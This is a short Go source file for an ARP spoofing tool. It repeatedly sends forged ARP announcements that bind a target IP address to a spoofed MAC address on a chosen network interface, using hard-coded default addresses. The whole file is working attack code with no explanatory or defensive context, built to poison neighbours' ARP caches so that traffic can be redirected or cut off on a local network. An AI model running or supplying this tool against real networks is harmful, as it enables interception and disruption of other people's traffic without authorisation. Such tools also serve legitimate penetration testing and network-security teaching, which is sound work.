package main

import (
	"flag"
	"fmt"
	marp "github.com/mdlayher/arp"
	"net"
	"os"
	"time"
)

const (
	defaultTargetIpString  = "200.201.202.144"
	defaultTargetMACString = "00:15:5D:09:B8:34"
	defaultSpoofMACString  = "DE:AD:BE:EF:11:12"
	defaultInterfaceString = "eth1"
)

var (
	writeTimeout, _ = time.ParseDuration("100ms")
)

func SendAnnounce(client *marp.Client,
	dstEther net.HardwareAddr, dstIP net.IP,
	hwAddr net.HardwareAddr) error {
	if packet, err := marp.NewPacket(marp.OperationRequest, hwAddr, dstIP, hwAddr, dstIP); err == nil {
		if err = client.SetWriteDeadline(time.Now().Add(writeTimeout)); err == nil {
			return client.WriteTo(packet, dstEther)
		} else {
			return err
		}
	} else {
		return err
	}
}

func main() {
	targetIPString := flag.String("targetIP", defaultTargetIpString, "The targeted IP")
	targetMACString := flag.String("targetMAC", defaultTargetMACString, "The targeted MAC")
	spoofMACString := flag.String("spoofMAC", defaultSpoofMACString, "The spoofed MAC")
	interfaceString := flag.String("interface", defaultInterfaceString, "Name of the interface to use")

	if flag.Parse(); !flag.Parsed() {
		flag.PrintDefaults()
		os.Exit(1)
	}

	if itf, err := net.InterfaceByName(*interfaceString); err == nil {
		if client, err := marp.Dial(itf); err == nil {
			targetMAC, _ := net.ParseMAC(*targetMACString)
			targetIP := net.ParseIP(*targetIPString)
			spoofMAC, _ := net.ParseMAC(*spoofMACString)

			for {
				fmt.Print(targetIP, " -> ", spoofMAC, ", err = ")
				err := SendAnnounce(client, targetMAC, targetIP, spoofMAC)
				fmt.Println(err)
				time.Sleep(time.Second)
			}
		} else {
			fmt.Println("ARP dial failed :", err)
			os.Exit(1)
		}
	} else {
		fmt.Println("Could not find interface", *interfaceString, ":", err)
		os.Exit(1)
	}
}
